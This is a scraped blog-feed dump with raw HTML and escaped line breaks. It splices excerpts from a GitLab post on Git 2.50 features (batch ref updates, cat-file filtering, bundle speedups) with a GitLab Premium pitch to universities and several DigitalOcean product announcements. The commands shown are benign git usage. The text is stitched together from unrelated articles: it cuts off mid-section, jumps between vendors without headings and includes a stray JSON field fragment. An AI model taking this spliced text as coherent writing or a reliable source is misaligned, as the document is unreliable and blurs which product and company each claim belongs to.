HEAD\ncf469bdf5436ea1ded57670b5f5a0797f72f1afc\n5a74cd330f04b96ce0666af89682d4d7580c354c\n5a6b339a8ebffde8c0590553045403dbda831518\n\n# Attempt to create a new reference and update existing reference in transaction.\n# Update is expected to fail because the specified old object ID doesn’t match.\n$ git update-ref --stdin &lt;&lt;EOF\n&gt; create refs/heads/bar cf469bdf5436ea1ded57670b5f5a0797f72f1afc\n&gt; update refs/heads/foo 5a6b339a8ebffde8c0590553045403dbda831518 5a74cd330f04b96ce0666af89682d4d7580c354c\n&gt; EOF\nfatal: cannot lock ref 'refs/heads/foo': is at cf469bdf5436ea1ded57670b5f5a0797f72f1afc but expected 5a74cd330f04b96ce0666af89682d4d7580c354c\n\n# The &quot;bar&quot; reference was not created.\n$ git switch bar\nfatal: invalid reference: bar\n</code></pre>\n<p>Compared to updating many references individually, updating in bulk is also\nmuch more efficient. While this works well, there might be certain\ncircumstances where it is okay for a subset of the requested reference updates\nto fail, but we still want to take advantage of the efficiency gains of bulk\nupdates.</p>\n<p>With this release, <code>git-update-ref(1)</code> has the new <code>--batch-updates</code> option,\nwhich allows the updates to proceed even when one or more reference updates\nfails. In this mode, individual failures are reported in the following format:</p>\n<pre><code class=\"language-text\">rejected SP (&lt;old-oid&gt; | &lt;old-target&gt;) SP (&lt;new-oid&gt; | &lt;new-target&gt;) SP &lt;rejection-reason&gt; LF\n</code></pre>\n<p>This allows successful reference updates to proceed while providing context to\nwhich updates were rejected and for what reason. Using the same example\nrepository from the previous example:</p>\n<pre><code class=\"language-shell\"># Attempt to create a new reference and update existing reference in transaction.\n$ git update-ref --stdin --batch-updates &lt;&lt;EOF\n&gt; create refs/heads/bar cf469bdf5436ea1ded57670b5f5a0797f72f1afc\n&gt; update refs/heads/foo 5a6b339a8ebffde8c0590553045403dbda831518 5a74cd330f04b96ce0666af89682d4d7580c354c\n&gt; EOF\nrejected refs/heads/foo 5a6b339a8ebffde8c0590553045403dbda831518 5a74cd330f04b96ce0666af89682d4d7580c354c incorrect old value provided\n\n# The &quot;bar&quot; reference was created even though the update to &quot;foo&quot; was rejected.\n$ git switch bar\nSwitched to branch 'bar'\n</code></pre>\n<p>This time, with the <code>--batch-updates</code> option, the reference creation succeeded\neven though the update didn't work. This patch series lays the groundwork for\nfuture performance improvements in <code>git-fetch(1)</code> and <code>git-receive-pack(1)</code>\nwhen references are updated in bulk.

For example:</p>\n<pre><code class=\"language-shell\"># Setup simple repository.\n$ git init\n$ echo foo &gt;foo\n$ git add foo\n$ git commit -m init\n\n# Create an unreachable object.\n$ git commit --amend --no-edit\n\n# Use git-cat-file(1) to print info about all objects including unreachable objects.\n$ git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)'\ncommit 0b07e71d14897f218f23d9a6e39605b466454ece\ntree 205f6b799e7d5c2524468ca006a0131aa57ecce7\nblob 257cc5642cb1a054f08cc83f2d943e56fd3ebe99\ncommit c999f781fd7214b3caab82f560ffd079ddad0115\n</code></pre>\n<p>In some situations, a user might want to search through all objects in the\nrepository, but only output a subset based on some specified attribute. For\nexample, if we wanted to see only the objects that are commits, we could use\n<code>grep(1)</code>:</p>\n<pre><code class=\"language-shell\">$ git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)' | grep ^commit\ncommit 0b07e71d14897f218f23d9a6e39605b466454ece\ncommit c999f781fd7214b3caab82f560ffd079ddad0115\n</code></pre>\n<p>While this works, one downside with filtering the output is that\n<code>git-cat-file(1)</code> still has to traverse all the objects in the repository, even\nthe ones that the user is not interested in. This can be rather inefficient.</p>\n<p>With this release, <code>git-cat-file(1)</code> now has the <code>--filter</code> option, which only\nshows objects matching the specified criteria. This is similar to the option of\nthe same name for <code>git-rev-list(1)</code>, but with only a subset of the filters\nsupported. The supported filters are <code>blob:none</code>, <code>blob:limit=</code>, as well as\n<code>object:type=</code>. Similar to the previous example, objects can be filtered by\ntype with Git directly:</p>\n<pre><code class=\"language-shell\">$ git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)' --filter='object:type=commit'\ncommit 0b07e71d14897f218f23d9a6e39605b466454ece\ncommit c999f781fd7214b3caab82f560ffd079ddad0115\n</code></pre>\n<p>Not only is it convenient for Git to handle the processing, for large\nrepositories with many objects, it is also potentially more efficient. If a\nrepository has bitmap indices, it becomes possible for Git to efficiently\nlookup objects of a specific type, and thus avoid scanning through the\npackfile, which leads to a significant speedup. Benchmarks conducted on the\n<a href=\"https://github.com/chromium/chromium.git\">Chromium repository</a> show\nsignificant improvements:</p>\n<pre><code class=\"language-text\">Benchmark 1: git cat-file --batch-check --batch-all-objects --unordered --buffer --no-filter\n   Time (mean ± σ):     82.806 s ±  6.363 s    [User: 30.956 s, System: 8.264 s]\n   Range (min … max):   73.936 s … 89.690 s    10 runs\n\nBenchmark 2: git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=tag\n   Time (mean ± σ):      20.8 ms ±   1.3 ms    [User: 6.1 ms, System: 14.5 ms]\n   Range (min … max):    18.2 ms …  23.6 ms    127 runs\n\nBenchmark 3: git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=commit\n   Time (mean ± σ):      1.551 s ±  0.008 s    [User: 1.401 s, System: 0.147 s]\n   Range (min … max):    1.541 s …  1.566 s    10 runs\n\nBenchmark 4: git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=tree\n   Time (mean ± σ):     11.169 s ±  0.046 s    [User: 10.076 s, System: 1.063 s]\n   Range (min … max):   11.114 s … 11.245 s    10 runs\n\nBenchmark 5: git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=blob\n   Time (mean ± σ):     67.342 s ±  3.368 s    [User: 20.318 s, System: 7.787 s]\n   Range (min … max):   62.836 s … 73.618 s    10 runs\n\nBenchmark 6: git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=blob:none\n   Time (mean ± σ):     13.032 s ±  0.072 s    [User: 11.638 s, System: 1.368 s]\n   Range (min … max):   12.960 s … 13.199 s    10 runs\n\nSummary\n   git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=tag\n    74.75 ± 4.61 times faster than git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=commit\n   538.17 ± 33.17 times faster than git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=tree\n   627.98 ± 38.77 times faster than git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=blob:none\n  3244.93 ± 257.23 times faster than git cat-file --batch-check --batch-all-objects --unordered --buffer --filter=object:type=blob\n  3990.07 ± 392.72 times faster than git cat-file --batch-check --batch-all-objects --unordered --buffer --no-filter\n</code></pre>\n<p>Interestingly, these results indicate that the computation time now scales with\nthe number of objects for a given type instead of the number of total objects\nin the packfile.

This operation\nis used by GitLab to generate repository backups and also as part of the\n<a href=\"https://git-scm.com/docs/bundle-uri\">bundle-URI</a> mechanism.</p>\n<p>For large repositories containing millions of references, this operation can\ntake hours or even days. For example, with the main GitLab repository\n(<a href=\"https://gitlab.com/gitlab-org/gitlab\">gitlab-org/gitlab</a>), backup times were\naround 48 hours. Investigation revealed there was a performance bottleneck due\nto how Git was performing a check to avoid duplicated references being included\nin the bundle. The implementation used a nested <code>for</code> loop to iterate and\ncompare all listed references, leading to O(N^2) time complexity. This scales\nvery poorly as the number of references in a repository increases.</p>\n<p>In this release, this issue was addressed by replacing the nested loops with a\nmap data structure leading to a significant speedup. The following benchmark\nthe performance improvement for creating a bundle with a repository containing\n100,000 references:</p>\n<pre><code class=\"language-text\">Benchmark 1: bundle (refcount = 100000, revision = master)\n  Time (mean ± σ):     14.653 s ±  0.203 s    [User: 13.940 s, System: 0.762 s]\n  Range (min … max):   14.237 s … 14.920 s    10 runs\n\nBenchmark 2: bundle (refcount = 100000, revision = HEAD)\n  Time (mean ± σ):      2.394 s ±  0.023 s    [User: 1.684 s, System: 0.798 s]\n  Range (min … max):    2.364 s …  2.425 s    10 runs\n\nSummary\n  bundle (refcount = 100000, revision = HEAD) ran\n    6.12 ± 0.10 times faster than bundle (refcount = 100000, revision = master)\n</code></pre>\n<p>To learn more, check out our blog post\n<a href=\"https://about.gitlab.com/blog/how-we-decreased-gitlab-repo-backup-times-from-48-hours-to-41-minutes/\">How we decreased GitLab repo backup times from 48 hours to 41 minutes</a>.\nYou can also find the original mailing list thread\n<a href=\"https://lore.kernel.org/git/20250401-488-generating-bundles-with-many-references-has-non-linear-performance-v1-0-6d23b2d96557@gmail.com/\">here</a>.</p>\n<p><em>This project was led by <a href=\"https://gitlab.com/knayakgl\">Karthik Nayak</a>.</em></p>\n<h2>Better bundle URI unbundling</h2>\n<p>Through the <a href=\"https://git-scm.com/docs/bundle-uri\">bundle URI</a> mechanism in Git,\nlocations to fetch bundles from can be provided to clients with the goal to\nhelp speed up clones and fetches. When a client downloads a bundle, references\nunder <code>refs/heads/*</code> are copied from the bundle into the repository along with\ntheir accompanying objects. A bundle might contain additional references\noutside of <code>refs/heads/*</code> such as <code>refs/tags/*</code>, which are simply ignored when\nusing bundle URI on clone.</p>\n<p>In Git 2.50, this restriction is lifted, and all references\nmatching <code>refs/*</code> contained in the downloaded bundle are copied.\n<a href=\"https://github.com/schacon\">Scott Chacon</a>, who contributed this functionality,\ndemonstrates the difference when cloning\n<a href=\"https://gitlab.com/gitlab-org/gitlab-foss\">gitlab-org/gitlab-foss</a>:</p>\n<pre><code class=\"language-shell\">$ git-v2.49 clone --bundle-uri=gitlab-base.bundle https://gitlab.com/gitlab-org/gitlab-foss.git gl-2.49\nCloning into 'gl2.49'...\nremote: Enumerating objects: 1092703, done.\nremote: Counting objects: 100% (973405/973405), done.\nremote: Compressing objects: 100% (385827/385827), done.\nremote: Total 959773 (delta 710976), reused 766809 (delta 554276), pack-reused 0 (from 0)\nReceiving objects: 100% (959773/959773), 366.94 MiB | 20.87 MiB/s, done.\nResolving deltas: 100% (710976/710976), completed with 9081 local objects.\nChecking objects: 100% (4194304/4194304), done.\nChecking connectivity: 959668, done.\nUpdating files: 100% (59972/59972), done.\n\n$ git-v2.50 clone --bundle-uri=gitlab-base.bundle https://gitlab.com/gitlab-org/gitlab-foss.git gl-2.50\nCloning into 'gl-2.50'...\nremote: Enumerating objects: 65538, done.\nremote: Counting objects: 100% (56054/56054), done.\nremote: Compressing objects: 100% (28950/28950), done.\nremote: Total 43877 (delta 27401), reused 25170 (delta 13546), pack-reused 0 (from 0)\nReceiving objects: 100% (43877/43877), 40.42 MiB | 22.27 MiB/s, done.\nResolving deltas: 100% (27401/27401), completed with 8564 local objects.\nUpdating files: 100% (59972/59972), done.\n</code></pre>\n<p>Comparing these results, we see that Git 2.50 fetches 43,887 objects\n(40.42 MiB) after the bundle was extracted whereas Git 2.49 fetches a\ntotal of 959,773 objects (366.94 MiB). Git 2.50 fetches roughly 95% fewer\nobjects and 90% less data, which benefits both the client and the server. The\nserver needs to process a lot less data to the client and the client needs to\ndownload and extract less data.

Development teams must support multidisciplinary collaboration across technical and non-technical departments while managing vast amounts of sensitive data – from student records and financial information to research findings and faculty evaluations.</p>\n<p>Most institutions face these challenges with limited IT resources, yet must support thousands of concurrent users across numerous projects and research initiatives. Research integrity requirements add another layer of complexity, as development work often needs to maintain traceability and reproducibility standards.</p>\n<h2>Premium solutions for educational institutions</h2>\n<p>GitLab Premium with Duo has the functionality that higher education needs.</p>\n<h3>Enhanced collaboration and workflow capabilities</h3>\n<p>Cross-departmental projects are common in educational settings – from multi-department research initiatives to custom module development for systems like Ellucian Banner, an enterprise resource planning application used by higher education. These complex projects require sophisticated workflow management that goes beyond basic version control.</p>\n<p>GitLab Premium addresses these challenges with powerful collaboration and project visualization features, including epics, roadmaps, and advanced Kanban boards for Agile development workflows. When you assign multiple approvers to certain merge requests and protected branches, you ensure higher code quality and accountability across teams. These tools allow institutions to coordinate work across departments while aligning with institution-wide objectives – essential for managing multiphase campus technology initiatives.</p>\n<p>In Australia, <a href=\"https://about.gitlab.com/customers/deakin-university/\">Deakin University’s</a> enablement team uses GitLab to build standardized processes and reusable templates — such as custom merge request templates, templated build pipelines, and a security and compliance framework — that can be shared with the broader university community and citizen developers, driving innovation and collaboration both inside the university and with key partners. “We were trying to bring in a community of practice and help it thrive for quite some time, but we were never successful until we had this tool,” said Aaron Whitehand, director of Digital Enablement at Deakin University.</p>\n<blockquote>\n<h4>Read more about <a href=\"https://about.gitlab.com/customers/deakin-university/\">how Deakin University uses GitLab to drive improvements</a> in collaboration and productivity, including a 60% reduction in manual tasks.</h4>\n</blockquote>\n<h3>Advanced data protection and governance</h3>\n<p>Educational institutions generate and manage vast amounts of data, ranging from student records and financial information to research findings and faculty evaluations. The security stakes are particularly high. The <a href=\"https://universitybusiness.com/in-just-3-months-this-data-breach-has-compromised-nearly-900-institutions/\">2023 MOVEit breach</a>, which spanned three months and compromised approximately 900 educational institutions, exposed the sensitive information of more than 62 million people. This demonstrates the critical need for proactive security measures integrated directly into higher education development workflows.</p>\n<p>Vulnerability scanning stops code releases that contain security risks, enabling institutions to establish and enforce governance protocols that protect sensitive information. These capabilities help universities implement proper access controls and permission structures for research databases, creating a secure framework where authorized researchers maintain appropriate access – effectively balancing robust protection with necessary collaboration.</p>\n<p>GitLab is built from the ground up to secure your source code. Scalable Git-based repositories, granular access controls, and built-in compliance features eliminate bottlenecks in your workflow while meeting security requirements. GitLab Premium provides audit tracking and compliance capabilities essential for educational environments. Complete audit trails capture detailed logs of all code changes, access attempts, and system modifications with timestamps and user attribution. Full change management documentation ensures traceability of who made what changes, when, and why – critical for research integrity – while access control auditing monitors repository access and permissions changes.</p>\n<h3>Cloud-based development environments and remote collaboration</h3>\n<p>Modern educational institutions require flexible development environments that support distributed teams, remote learning scenarios, and diverse technical requirements. GitLab Premium provides:</p>\n<ul>\n<li><strong><a href=\"https://docs.gitlab.com/user/workspace/\">GitLab Workspaces</a>:</strong> Cloud-based development environments accessible from any device</li>\n<li><strong><a href=\"https://docs.gitlab.com/user/project/web_ide/\">Web IDE integration</a>:</strong> Browser-based coding with full GitLab feature integration</li>\n<li><strong><a href=\"https://about.gitlab.com/blog/build-and-run-containers-in-remote-development-workspaces/\">Container-based development</a>:</strong> Consistent, reproducible development environments across different projects and user groups</li>\n</ul>\n<p>These capabilities are particularly valuable for supporting remote and hybrid learning models, enabling students and researchers to access standardized development environments regardless of their physical location or local hardware constraints.</p>\n<h3>Professional support for critical systems</h3>\n<p>Small IT teams in educational settings often support large, complex infrastructure with minimal resources. Reaching out to user forums for answers doesn't always mean you'll get an accurate reply and isn't efficient for large teams. GitLab Premium includes dedicated professional support, providing faster issue resolution and upgrade assistance during critical periods like class enrollment or research deadlines.</p>\n<p>This minimizes downtime for critical services and ensures continuity of operations during peak usage periods, giving stretched IT departments the enterprise-grade reliability they need for essential academic systems.</p>\n<h3>Built on open source with enterprise capabilities</h3>\n<p>Open source software is developed collaboratively in a public manner, with source code freely available for anyone to view, modify, and distribute. This development model fosters innovation through community contributions and ensures transparency in how software functions. GitLab's open source foundation resonates strongly with educational institutions' values around collaboration, transparency, and community contribution. GitLab Premium features extend this foundation with enterprise-grade capabilities while maintaining the ability to contribute back to the open source ecosystem.</p>\n<p>Key open source advantages include:</p>\n<ul>\n<li><strong>Transparency:</strong> Complete visibility into platform capabilities and security measures – you can examine exactly how the software works</li>\n<li><strong>Community contribution:</strong> Ability to contribute improvements back to the broader community and benefit from global developer expertise</li>\n<li><strong>Vendor independence:</strong> Reduced lock-in risk with open source alternatives and the freedom to modify code as needed</li>\n<li><strong>Co-creation opportunities:</strong> Collaborative development with the broader community, including other educational institutions, to build shared solutions</li>\n</ul>\n<h3>AI assistant for software development tasks</h3>\n<p>GitLab Premium with <a href=\"https://about.gitlab.com/gitlab-duo/\">Duo</a> brings powerful AI-native capabilities directly into the development workflow, including:</p>\n<ul>\n<li><a href=\"https://docs.gitlab.com/user/project/repository/code_suggestions/\"><strong>Code Suggestions</strong></a>, which provides real-time code completion and suggestions, helping developers write code faster and more efficiently</li>\n<li><a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/\"><strong>Chat</strong></a>, which allows team members to get instant answers to questions, troubleshoot issues, and access documentation directly within the GitLab environment</li>\n</ul>\n<p>These AI tools significantly enhance productivity, reduce errors, and streamline collaboration, making GitLab Premium an even more valuable asset for software development teams in higher education.</p>\n<h3>Transparency at the core</h3>\n<p>Higher education institutions handle incredibly sensitive data — from student records and research findings to proprietary academic work and federal grant information.</p>\n<p>The <a href=\"https://about.gitlab.com/ai-transparency-center/\">GitLab AI Transparency Center </a>demonstrates our commitment to transparency, accountability, and protection of customer data and intellectual property, providing the privacy guarantees that educational institutions require.</p>\n<p>GitLab launched the AI Transparency Center to help customers, community, and team members better understand how GitLab upholds ethics and transparency in our AI-powered features.</p>\n<p>Our publicly available documentation highlights the comprehensive measures we take to protect your institution's data and intellectual property. <a href=\"https://handbook.gitlab.com/handbook/legal/ethics-compliance-program/ai-ethics-principles/\">GitLab's AI Ethics Principles for Product Development</a> guide us as we continue to build and evolve our AI functionality, helping higher education organizations harness the promise of AI while maintaining complete control and oversight of their most valuable information assets.</p>\n<h2>Get started with GitLab Premium today</h2>\n<p>For educational institutions, GitLab Premium with Duo represents a strategic technical investment that combines the benefits of open source development with enterprise-grade, AI-native capabilities.

With custom roles, teams can now assign permissions to individuals that are precisely aligned with their operational and security requirements, reinforcing the principle of least privilege. This allows for more precise permission management, which helps to enhance overall infrastructure security by reducing the risk of over-privileged accounts. Custom roles give you full control over who can do what on your projects, improving the overall security of your cloud resources.</p>\n<p>In this blog post, we will walk through what custom roles are, how they work, key features, when to use them, and how they can help your team.</p>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"what-are-custom-roles\"><a href=\"https://www.digitalocean.com/blog.atom#what-are-custom-roles\">What are custom roles?</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#what-are-custom-roles\"></a></h2>\n\n<p>Custom roles are user-defined sets of permissions that allow organizations to tailor access control to their specific needs, beyond what’s available in predefined roles. In other words, custom roles let you create your own set of permissions instead of relying only on default, predefined roles (like Viewer, Billing Viewer, etc.) that may not work for you. Now, users can define more detailed custom permissions that target specific resources and needs. For example, a user may only need read access to Droplets, but write access to Kubernetes.</p>\n<p>Hear what a DigitalOcean customer had to say about using custom roles. This customer is a Co-founder of a revenue management company:</p>\n<p>“Custom roles helped me bring my team onto the platform without granting blanket access.

But constraints like limited time or resources may restrict how much time you spend on user access management. This is where predefined roles prove to be helpful! For many common scenarios, predefined roles, like <em>Owner, Member, Modifier, Biller, Billing Viewer, and Resource Viewer</em>, are a quick and efficient way to assign access. If granular access control isn’t necessary, these roles—available conveniently in the cloud control panel—cover standard use cases.</p>\n<p>Custom roles are best when predefined roles don’t align with the specific responsibilities of your team, or members of other teams that are working on a given project. For example, you might need to give a user read-only access to Droplets but write access to Kubernetes, or let someone manage App Platform while restricting access to Droplets.

      "summary": "<p>Building and scaling cloud infrastructure often means navigating fragile network configurations, unpredictable IP behavior, and rigid networking provider limitations. Whether it’s dealing with flaky multi-cloud connections, scrambling to update IP allow-lists after a restart, or hesitating to migrate workloads due to reputation-bound IPs, these challenges add unnecessary risk and complexity to modern deployments.</p>\n<p>We’re excited to announce three new updates designed to simplify cloud networking and enhance deployment flexibility: Partner Network Connect supports high availability and DOKS, general availability of Reserved IPv6 on Droplets, and public preview of Bring Your Own IP (BYOIP). These improvements address real-world infrastructure challenges and are built with simplicity, scalability, and reliability in mind.</p>\n<details class=\"collapsible\" open=\"\">\n\n<h1 id=\"partner-network-connect-now-supports-high-availability-and-doks\"><a href=\"https://www.digitalocean.com/blog.atom#partner-network-connect-now-supports-high-availability-and-doks\">Partner Network Connect now supports high availability and DOKS</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#partner-network-connect-now-supports-high-availability-and-doks\"></a></h1>\n\n<p>Multi-cloud architectures are great, until the private links between them become a single point of failure. For teams routing traffic between multiple cloud providers like DigitalOcean, AWS, Microsoft Azure, or Google Cloud Platform, even brief disruptions can stall ML pipelines, gaming platforms, or analytics services. Traditional setups offer limited redundancy, and recovering from outages usually involves manual intervention or rerouting traffic over public networks.</p>\n<p>High Availability for Partner Network Connect helps solve this by letting you provision redundant links across two separate DigitalOcean gateway routers. Traffic automatically fails over if one link goes down, with no manual steps required and no impact to your customers.</p>\n<p>With fully managed failover, this update removes operational overhead while helping meet the needs of latency-sensitive or distributed systems.</p>\n<figure><img alt=\"Partner Network Connect high availability\" src=\"https://networking.nyc3.digitaloceanspaces.com/PNC%20HA.png\" /><figcaption>Partner Network Connect high availability</figcaption></figure>\n<p><strong>Key benefits include:</strong></p>\n<ul>\n<li>\n<p><strong>Automatic failover:</strong> Eliminate downtime from single link failures.</p>\n</li>\n<li>\n<p><strong>Reliable for demanding workloads:</strong> Especially useful for platforms in streaming, AI, or multiplayer applications .</p>\n</li>\n<li>\n<p><strong>Straightforward setup:</strong> Provision HA connections in minutes—no complex BGP or custom failover scripts.</p>\n</li>\n</ul>\n<p><strong>Multi-cloud connectivity for your DOKS workloads.</strong></p>\n<p>Connecting Kubernetes clusters across clouds often requires brittle workarounds, manual routing, or exposure to the public internet. You can now create a VPC-native DOKS cluster, connect your VPC to a Partner Attachment, and establish seamless connectivity between your DOKS workloads on DigitalOcean and Kubernetes workloads running in AWS or other cloud environments. This enables more secure, low-latency communication between clusters without the complexity of custom networking.</p>\n<p><strong>Real-world use case:</strong>\nSaaS and AdTech companies often span multiple clouds to optimize performance and align with partner ecosystems. For example, an application might run on DigitalOcean while relying on another cloud provider for third-party data streams. With high availability (HA), these businesses can maintain private, always-on connectivity—without compromising on security or speed.</p>\n<p>See for yourself how simple it is to set up Partner Network Connect.

When a Droplet is recreated or rebooted, IPv6 changes can break client connections or force painful reconfiguration. That’s a non-starter for services that demand availability and consistent access.</p>\n<p>Reserved IPv6 fixes this. You can now allocate static IPv6 addresses, independent of any Droplet lifecycle. Whether you reboot, rebuild, or replace a Droplet, your IPv6 address stays the same.</p>\n<p><strong>Key benefits include:</strong></p>\n<ul>\n<li>\n<p><strong>Persistent addresses:</strong> Assign once, move across Droplets within the same region.</p>\n</li>\n<li>\n<p><strong>Zero downtime for upgrades:</strong> Keep clients connected without touching firewall rules or DNS.</p>\n</li>\n<li>\n<p><strong>No separate fee:</strong> Included as a standard feature, just like IPv4 reservations.</p>\n</li>\n</ul>\n<figure><img alt=\"Reserved IPv6 on Droplets\" src=\"https://networking.nyc3.digitaloceanspaces.com/Reserved-IP.gif\" /><figcaption>Reserved IPv6 on Droplets</figcaption></figure>\n<p>DigitalOcean’s implementation makes it easy to use Reserved IPv6 through the UI or API. You can automate migrations or failover without complex routing logic or pre-warming steps. Learn <a href=\"https://docs.digitalocean.com/products/networking/reserved-ips/how-to/create/\" rel=\"ugc nofollow noopener\" target=\"_blank\">How to Create Reserved IPs</a> to get started.</p>\n<p><strong>Real-world use case:</strong>\nDecentralized networks hardcode IPv6 addresses into client binaries. Without static IPs, every address change requires a new software release and coordination across thousands of nodes—creating operational friction. Reserved IPv6 addresses help eliminate this pain point. Similarly, security-focused organizations use fixed IPs to allow-list scanning infrastructure and validate DDoS protections with consistent, persistent connectivity.</p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h1 id=\"bring-your-own-ip-byoip-public-preview\"><a href=\"https://www.digitalocean.com/blog.atom#bring-your-own-ip-byoip-public-preview\">Bring Your Own IP (BYOIP) Public preview</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#bring-your-own-ip-byoip-public-preview\"></a></h1>\n\n<p>When migrating workloads or expanding multi-cloud presence, IP address stability is more than a convenience—it’s a requirement. Teams rely on known IPs for allow-listing, branding, and email reputation. Changing those addresses can break integrations or trigger spam filters. Worse, some teams delay cloud migrations entirely just to preserve IP trust.</p>\n<p>With BYOIP, now available for public preview, you can import your own public IPv4 blocks and assign them to Droplets or Kubernetes nodes on DigitalOcean, avoiding the need to renumber or experience downtime.</p>\n<p><strong>Key benefits include:</strong></p>\n<ul>\n<li>\n<p><strong>Retain IP trust and deliverability:</strong> Especially valuable for marketing platforms or email-forwarding SaaS.</p>\n</li>\n<li>\n<p><strong>Simplify migration:</strong> Keep IPs when transitioning from other providers or on-prem systems.</p>\n</li>\n<li>\n<p><strong>Secure client access:</strong> Maintain allow-lists without reconfiguration.</p>\n</li>\n</ul>\n<p><strong>No separate fee :</strong> Included as a standard feature to bring or use your own addresses.</p>\n<p>Provisioning requires just three inputs and typically completes in 7 business days, significantly faster than the multi-week processes common with many hyperscalers. There’s no need for multiple pools or route table gymnastics, and support is in place for both VMs and managed K8s. Once provisioned, assign your addresses to Droplets using the same interface and APIs as <a href=\"https://docs.digitalocean.com/products/networking/reserved-ips/\" rel=\"ugc nofollow noopener\" target=\"_blank\">Reserved IPs</a>.</p>\n<figure><img alt=\"Bring your Own IP\" src=\"https://networking.nyc3.digitaloceanspaces.com/BYOIP.png\" /><figcaption>Bring your Own IP</figcaption></figure>\n<p><strong>Real-world use case:</strong>\nFleet tracking and IoT platforms often require consistent IP addresses across thousands of devices—any changes can trigger widespread reconnects and risk data loss. Similarly, SaaS platforms offering white-labeled deployment environments across regions and partners depend on custom IPs to maintain trusted infrastructure without disruption. Reserved IPs help streamline operations and avoid migration headaches.</p>\n<p>These updates go beyond feature releases, giving developers and ops engineers tighter control over how their environments are connected and managed.

Let’s walk through all three of them.</p>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"datadog-integration\"><a href=\"https://www.digitalocean.com/blog.atom#datadog-integration\">Datadog Integration</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#datadog-integration\"></a></h2>\n\n<p>DigitalOcean Managed Databases now supports <strong>log forwarding to Datadog</strong><em>,</em> enabling seamless integration to your existing Datadog observability dashboard. You can now send, view, and analyze your Managed Database logs directly within Datadog. This feature will enhance your overall observability and monitoring. Key features of this integration include:</p>\n<ul>\n<li>\n<p><strong>Direct log forwarding:</strong> This feature automatically pushes your database service logs to Datadog’s log intake endpoints, eliminating the need to manage a separate log collection agent. By automating log forwarding, you no longer have to worry about deploying, managing, or scaling additional logging agents, which helps to reduce operational complexity.</p>\n</li>\n<li>\n<p><strong>UI-based configuration:</strong> The integration is fully configurable through the management console, allowing you to set it up for most database types directly within the log forwarding section. UI-based configuration simplifies the setup process and consolidates your database logs with application and infrastructure telemetry, improving visibility and monitoring—all without the need for managing separate agents.</p>\n</li>\n<li>\n<p><strong>Customizable log templates:</strong> The Datadog log template can be customized per database, enabling specific log details or filtering to suit your needs. Tailoring log outputs for each database allows you to reduce unnecessary data, minimize Datadog ingestion and indexing costs, and focus on the log data most relevant to your business.</p>\n</li>\n</ul>\n<p>Ultimately, by offering integration with Datadog, one of the most popular observability platforms, you gain control over your observability stack. This integration will allow you to easily and quickly forward customized database logs directly to your Datadog dashboard, which in an increasingly multicloud world, is very valuable.</p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"default-resource-alerts-and-advanced-cluster-event-notifications\"><a href=\"https://www.digitalocean.com/blog.atom#default-resource-alerts-and-advanced-cluster-event-notifications\">Default resource alerts and advanced cluster event notifications</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#default-resource-alerts-and-advanced-cluster-event-notifications\"></a></h2>\n\n<p>The second advancements are <strong>default resource alerts</strong> and <strong>advanced cluster event notifications.</strong> While similar, they are distinct from one another.</p>\n<p>Default resource alerts are pre-configured notifications that automatically warn you when your database approaches critical resource thresholds–such as CPU, memory, or disk space. These alerts act as an early warning system, helping you catch performance degradation or potential downtime before it happens. Because they’re enabled by default when new databases are created, there’s no setup required–giving you seamless, always-on monitoring that keeps your team informed.</p>\n<p>Advanced cluster event notifications, on the other hand, are triggered by significant lifecycle events within your cluster–such as high resource utilization, failovers, node restarts, or maintenance actions. These event-based alerts provide real-time operational insight, allowing your team to respond quickly to changes, perform root cause analysis, and maintain uptime without digging through logs. Like default resource alerts, they’re fully automated and designed to keep you in the loop without any extra effort.</p>\n<p>Together, these features give you deeper observability into your cluster’s behavior and health, helping you stay proactive, stable, and ready to respond.</p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"trusted-sources-ip-labeling\"><a href=\"https://www.digitalocean.com/blog.atom#trusted-sources-ip-labeling\">Trusted sources IP Labeling</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#trusted-sources-ip-labeling\"></a></h2>\n\n<p>The third advancement we have made is <strong>trusted IP sources labeling.</strong> This feature allows you to assign descriptive labels to the IP addresses in your whitelist, making it easier to identify, manage, and audit connection origins for your Managed Databases. By enabling you to tag IP entries with meaningful labels, this feature improves the usability and manageability of your database’s allowlist, especially when working with large or dynamically changing sets of IPs.</p>\n<p>Trusted source IP labeling also contributed to stronger database hardening, which is the practice of securing a database by implementing security best practices to minimize vulnerability. By decreasing the likelihood of operation errors, such as accidentally modifying or deleting the wrong IP address, this feature helps reduce the risk of misconfigurations that could expose your database to threats. Overall, it enhances your overall security posture by providing better visibility into which systems or teams are authorized to connect your database services.</p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"resources-to-get-started\"><a href=\"https://www.digitalocean.com/blog.atom#resources-to-get-started\">Resources to get started</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#resources-to-get-started\"></a></h2>\n\n<p>Ready to get started?

